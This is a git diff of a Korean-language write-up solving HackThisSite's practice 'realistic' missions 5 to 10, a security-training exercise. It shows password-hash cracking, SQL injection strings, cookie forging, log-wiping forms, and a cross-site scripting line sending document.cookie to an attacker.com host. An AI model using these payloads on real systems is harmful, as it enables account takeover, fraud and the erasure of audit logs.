@@ -119,6 +119,8 @@ Bobby@friends.com
 
 - 출력된 이메일을 HTS 메시지로 SaveTheWhales에게 전송하면 클리어했다고 메시지 온다.
 
+![4_SaveTheWhales.png](images/4_SaveTheWhales.png)
+
 ## Level 5. Damn Telemarketers!
 ### 문제해결
 
@@ -139,6 +141,8 @@ admin.bak.php 파일을 클릭해보니 `error matching hash 7c5cbbedf29ebc07566
 hash로 암호화되어있는 파일을 해독하기 위해 [***cain & abel***](https://en.wikipedia.org/wiki/Cain_and_Abel_(software))  이라는프로그램 사용하였는데, 사용 방법은 다음과 같다. 
 소프트웨어를 설치하고 cracker-MD4 Hashes에 add to list에 hash string을 넣고 bruteforce하면 해독된 값이 나온다.
 
+![5_cain_abel.png](images/5_cain_abel.png)
+
 - 결과값으로 나온 `05e04` 를 [database](https://www.hackthissite.org/missions/realistic/5/submit.html)의 패스워드 입력창에 넣으면 클리어!
 
 ## Level 6. ToxiCo Industrial Chemicals
@@ -146,7 +150,11 @@ hash로 암호화되어있는 파일을 해독하기 위해 [***cain & abel***](
 
 ## Level 7. What's Right For America
 ### 문제해결
-http://www.hackthissite.org/missions/realistic/7/images/ 에서 보면 파일 목록 볼 수 있고, admin directory가 리스트에 보인다. 리스트에서 admin을 클릭하여 http://www.hackthissite.org/missions/realistic/7/images/admin 에 접속하려고 하니 사용자 이름과 비밀번호를 입력하라고 한다. 여기에 접속하는 것이 관건인 듯...
+http://www.hackthissite.org/missions/realistic/7/images/ 에서 보면 파일 목록 볼 수 있고, admin directory가 리스트에 보인다. 
+
+![7_images_list.png](images/7_images_list.png)
+
+리스트에서 admin을 클릭하여 http://www.hackthissite.org/missions/realistic/7/images/admin 에 접속하려고 하니 사용자 이름과 비밀번호를 입력하라고 한다. 여기에 접속하는 것이 관건인 듯...
 
 이미지 파일 불러올 때 아래와 같이 불러온다.
 ```text
@@ -184,9 +192,8 @@ page not found를 봤지만 포기하지 않고, 본 페이지에서 이미지�
 </td></tr></table>
 ```
 
-- http://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htpasswd
-  + 거의 다 온 것 같다.
-	+ 소스코드보기로 확인
+- 거의 다 온 것 같다. 소스코드보기로 확인
+- `http://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htpasswd`
 
 ```html
 <center><a href="administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1
@@ -194,101 +201,170 @@ page not found를 봤지만 포기하지 않고, 본 페이지에서 이미지�
 " width=100></a> <a href=""><img src="" width=100></a> </center></font>
 </td></tr></table>
 ```
-  + `administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1`를 이전 레벨에서와 같이 카인&아벨에 넣어보았으나 그걸로는 안깨졌다. 
-	+ 칼리리눅스에 있는 john the ripper로 크랙
+  + `administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1`를 이전 레벨에서와 같이 카인&아벨에 넣어보았으나 그걸로는 안깨졌다. 칼리리눅스에 있는 john the ripper로 해결!
 
 ```
 Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 12x]) shadow(administrator) guesses: 1  time: 0:00:00:00 DONE (Wed Nov 5 16:09:07 2014) c/s: 2500  trying: 123456 - diamond Use the "--show" option to display all of the cracked passwords reliably
 ```
-위와 같은 메시지가 나오면서 크랙이 완료된다. `/images/admin`에 아래 코드를 넣으면 클리어! ID: administrator, password: shadow
+위와 같은 메시지가 나오면서 크랙이 완료된다. `/images/admin`에 아래 코드를 넣으면 클리어! 
 
-## Level 8. United Banks Of America
+ID: administrator, password: shadow
+
+## Level 8. United Banks Of America
+
+### 문제 요약
+-. Find the account of Gary Hunter (I don't know his account name
+  - --> GaryWilliamHunter
+2. Move the $10,000,000 into the account dropCash.
+3. Clear The Logs, They're held in the folder 'logFiles'. © All Rights Reserved (Linkback is required) linkback 필요하다는 것 생각해두기
+
 ### 문제해결
-목표 1. Find the account of Gary Hunter (I don't know his account name). --> GaryWilliamHunter 2. Move the $10,000,000 into the account dropCash. 3. Clear The Logs, They're held in the folder 'logFiles'. © All Rights Reserved (Linkback is required) linkback 필요하다는 것 생각해두기. form-post방식, 클릭하면 login2.php로 이동.  / input name: username, Password register.php -> register2.php 등록한 후 로그인하면 들어가짐. 로그인된 경우에 돈 이동시킬 수 있음. user info 18글자만 입력 가능. search.php -> search2.php POST방식 '를 넣으면 인젝션 취약점 있는듯. 아이디를 넣으면 memo에 있는 내용이 출력됨. ' or 1=1 입력했더니 아이디랑 메모 나옴. 의심가는 사람 GaryWilliamHunter : -- $$$$$ -- 다 포스트방식이므로 javascript넣어야 할듯.
-javascript:alert(document.cookie)
-ihateboa/123으로 로그인 후 쿠키 보면 아래와 같음.
+- form-post방식, 클릭하면 login2.php로 이동
+  + / input name: username, Password
+	+ register.php -> register2.php
+- 등록한 후 로그인하면 들어가짐. 로그인된 경우에 돈 이동시킬 수 있음
+- user info
+  + 18글자만 입력 가능
+- search.php -> search2.php
+  + POST방식 '를 넣으면 인젝션 취약점 있는듯
+- 아이디를 넣으면 memo에 있는 내용이 출력됨
+- `' or 1=1` 입력했더니 아이디랑 메모 나옴
+- 의심가는 사람: GaryWilliamHunter : -- $$$$$ --
+- 다 포스트방식이므로 javascript넣어야 할듯
+- `javascript:alert(document.cookie)`
+  + `ihateboa/123`으로 로그인 후 쿠키 보면 아래와 같음
+	![boa](images/8_boa.png)
+	http://www.hackthissite.org/missions/realistic/8/login2.php
+- 돈 먼저 옮기고, 로그삭제
+  + `javascript:document.cookie="accountUsername=GaryWilliamHunter;"`
+  + 아무 아이디나 로그인 한 상태에서 id만 게리헌터로 쿠키 변조
 
-http://www.hackthissite.org/missions/realistic/8/login2.php
-돈 먼저 옮기고, 로그삭제
-javascript:document.cookie="accountUsername=GaryWilliamHunter;"
-아무 아이디나 로그인 한 상태에서 id만 게리헌터로 쿠키 변조.
-돈 옮기기.
-javascript:document.write("
-<form action='movemoney.php' method='POST'> <input type='submit' value='Move Money To A Different Account'> <input type='text' name='TO' value='dropCash'> <input type='text' name='AMOUNT' value='10000000'> </form> ")
-로그 지우기.
-javascript:document.write("
-<form action='cleardir.php' method='POST'> <input type='hidden' name='dir' value='logFiles'> <input type='submit' value='Clear Files In Personal Folder'></form>
-</form> ")
+- 돈 옮기기
+```javascript
+javascript:document.write("<form action='movemoney.php' method='POST'> <input type='submit' value='Move Money To A Different Account'> <input type='text' name='TO' value='dropCash'> <input type='text' name='AMOUNT' value='10000000'> </form>")
+```
+
+- 로그 지우기
+```javascript
+javascript:document.write("<form action='cleardir.php' method='POST'> <input type='hidden' name='dir' value='logFiles'> <input type='submit' value='Clear Files In Personal Folder'></form>
+</form>")
+```
 
 ## Level 9. CrappySoft Software
 ### 문제해결
-상사의 계정으로 들어가서 online payment system에 접속하기. 일단은 본인 아이디 사용하기 Username: r-conner@crappysoft.com Password: ilovemywork Demo에 보면 프로그램 다운받을 수 있고, 실행시켜보면 아래와 같이 오류메시지가 뜨고 관리자 아이디가 나옴.
+- 상사의 계정으로 들어가서 online payment system에 접속하기
+  + 일단은 본인 아이디 사용하기
+	+ Username: r-conner@crappysoft.com Password: ilovemywork
+- Demo에 보면 프로그램 다운받을 수 있고, 실행시켜보면 아래와 같이 오류메시지가 뜨고 관리자 아이디가 나온다.
+![9_crappy-soft-software.png](images/9_crappy-soft-software.png)
 
-상사 이메일은 메시지 보내기에서 확인 가능하므로, 특별히 얻을 정보 없음.
-m-crap@crappysoft.com 쿠키정보 확인.
-javascript:alert(document.cookie)
-
-안에 내용 볼 수 있음. 로그파일 있음.
-세션하이잭킹.
-코드는 아래와같은 형식으로 해야됨(강사님이 제공해주심)
+- 상사 이메일은 메시지 보내기에서 확인 가능하므로, 특별히 얻을 정보 없음
+- `m-crap@crappysoft.com` 쿠키정보 확인
+  + `javascript:alert(document.cookie)`
+
+#### 세션하이잭킹
+
+```html
 <script> url="http://attacker.com/getCookie.php?cookie="+document.cookie;window.open(url,width-0,height=-;</script>
-이 스크립트를 private message로 보내면 아래 정보 나옴.
-strUsername=m-crap%40crappysoft.com; strPassword=94a35a3b7befff5eb2a8415af04aa16c;
+```
+
+- 위 스크립트를 private message로 보내면 아래 정보 나온다.
+
+```text
+strUsername=m-crap%40crappysoft.com;
+strPassword=94a35a3b7befff5eb2a8415af04aa16c;
 intID=1;
-이걸 이용해서 쿠키정보 입력(가짜로그인)
-javascript:document.cookie="strUsername=m-crap%40crappysoft.com;"
+```
+
+- 이걸 이용해서 쿠키정보 입력(가짜로그인)
+```javascript
+javascript:document.cookie="strUsername=m-crap%40crappysoft.com;"
 javascript:document.cookie="strPassword=94a35a3b7befff5eb2a8415af04aa16c;"
 javascript:document.cookie="intID=1;"
-
+```
 
-로그파일 지우기.
-아래 경로에서 로그파일 볼 수 있음.
-http://www.hackthissite.org/missions/realistic/9/files/
-로그파일 경로: ./files/logs/logs.txt
-메일링리스트 경로: ./files/mailinglist/addresses.txt
-이메일리스트에 가입하는 페이지에서 정보를 address.txt에 저장하는 내용 있음.
-->이걸 이용해서 로그파일에 내용""으로 덮어쓰기.
-javascript:document.write("<form action=subscribemailing.php method=post><input type=hidden name=strFilename value=./files/logs/logs.txt><input type=hidden name=strEmailAddress value=''><input type='submit' value='replacelogs'></form>")
-"" 안에 '로 묶어주거나 ''없이 써줘야함.
-level10: Holy Word High School
-학점바꾸기.
-ID: Zach Sanchez
-password: liberty638
-Student Access System 로그인창 sql injection x
-but get방식.
-student.php?uusername=Zach Sanchez&ppassword=liberty638&action=viewgrades&course=Mathematics 
-bible study 2학기 fail
-gym 2학기 fail
-staff정보
-Mr. Jonathan Goodman  Bible Study jgoodman@holycross.edu 
-Mrs. Ann Feldman P.E.Health   afeldman@holycross.edu
-
+![9_crappy-soft-fake-login.png](images/9_crappy-soft-fake-login.png)
+
+- 로그파일 지우기
+  + http://www.hackthissite.org/missions/realistic/9/files/ 에서 로그파일확인
+	+ 로그파일 경로: ./files/logs/logs.txt
+  + 메일링리스트 경로: ./files/mailinglist/addresses.txt
+	+ 이메일리스트에 가입하는 페이지에서 정보를 address.txt에 저장하는 내용 있음
+	+ ->이걸 이용해서 로그파일에 내용""으로 덮어쓰기.
+
+```javascript
+javascript:document.write("<form action=subscribemailing.php method=post><input type=hidden name=strFilename value=./files/logs/logs.txt><input type=hidden name=strEmailAddress value=''><input type='submit' value='replacelogs'></form>")
+```
+
+- 주의! "" 안에 '로 묶어주거나 ''없이 써줘야 한다.
+
+## Level 10: Holy Word High School
+### 문제 요약
+
+#### 학점바꾸기
+- ID: Zach Sanchez
+- password: liberty638
+- Student Access System 로그인창 sql injection x, but get방식
+- `student.php?uusername=Zach Sanchez&ppassword=liberty638&action=viewgrades&course=Mathematics`
+- bible study 2학기 fail, gym 2학기 fail
+
+#### staff정보
+- Mr. Jonathan Goodman Bible Study jgoodman@holycross.edu
+- Mrs. Ann Feldman P.E.Health afeldman@holycross.edu
+
+```
 http://192.168.0.65/blind.php?id=1 union SELECT id,title,news from Anews union all select COLUMN_NAME,COLUMN_NAME,COLUMN_NAME from information_schema.COLUMNS
-http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Zach Sanchez;&ppassword=
-http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Jonathan Goodman;&ppassword=
-
-
+```
+```
+http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Zach Sanchez;&ppassword=
+```
+```
+http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Jonathan Goodman;&ppassword=
+```
+
+```javascript
 javascript:document.write("
 <form action=/missions/basic/4/level4.php method=post> <input type=hidden name=to value=sam2@hsite.abc /><input type=submit value=Send password to Sam /></form></center><br /><br /><center><b>Password:</b><br /> <form action=/missions/basic/4/index.php method= post> <input type=password name=password  /><br /><br /> <input type=submit value=submit /></form>
 ")
-id=1번, id/pw 동일함.
+```
+
+- id=1번, id/pw 동일함
+```
 http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Jonathan Goodman;&ppassword=
-관리자로그인창
-http://www.hackthissite.org/missions/realistic/10/staff.php
-smiller / smiller Welcome, Mrs. Samantha Miller! Please remember that access to the staff administration area is restricted to the district-supplied 'holy_teacher' web browser. 웹브라우저가 holy_teacher웹브라우저인 경우에만 접속 가능.
+```
+
+- 관리자로그인창: http://www.hackthissite.org/missions/realistic/10/staff.php
+
+smiller / smiller
+
+Welcome, Mrs. Samantha Miller! Please remember that access to the staff administration area is restricted to the district-supplied 'holy_teacher' web browser.
+- 웹브라우저가 holy_teacher웹브라우저인 경우에만 접속 가능
 
+접속한 브라우저 확인
+```javascript
 javascript:alert(navigator.userAgent)
-하면 접속한 브라우저 확인 가능.
-
-
-* 익스플로러-도구-개발자도구-도구-사용자에이전트문자열변경-사용자지정-holy_teacher로 변경.
+```
+- 익스플로러-도구-개발자도구-도구-사용자에이전트문자열변경-사용자지정-holy_teacher로 변경
 
 이번에는 아래와 같은 메시지 나옴.
-note:you are not an administrator so you cannot change grades
-권한변경해주기.
+- note:you are not an administrator so you cannot change grades
+
+권한변경해주기
+```javascript
 javascript:document.cookie="admin=1;"
+```
 변경가능해졌음.
-submit grades
+
+- submit grades
+
 Sorry, Mrs. Samantha Miller, it is too late into the school year to change grades now.
-Change Grades의 소스보기에서바꿀 내용의 form 보고 get방식의 코드 작성해줌.(post방식으로는 안됨)
-http://www.hackthissite.org/missions/realistic/10/staff.php?action=changegrades&changeaction=modrec&rec=0&studentid=1&grade=5&comments=HACKED GRADE1 http://www.hackthissite.org/missions/realistic/10/staff.php?action=changegrades&changeaction=modrec&rec=3&studentid=1&grade=5&comments=HACKED GRADE2
+```
+Change Grades의 소스보기에서바꿀 내용의 form 보고 get방식의 코드 작성해줌(post방식으로는 안됨)
+```
+#### GRADE1
+http://www.hackthissite.org/missions/realistic/10/staff.php?action=changegrades&changeaction=modrec&rec=0&studentid=1&grade=5&comments=HACKED
+
+#### GRADE2
+http://www.hackthissite.org/missions/realistic/10/staff.php?action=changegrades&changeaction=modrec&rec=3&studentid=1&grade=5&comments=HACKED
+
+해결 완료!
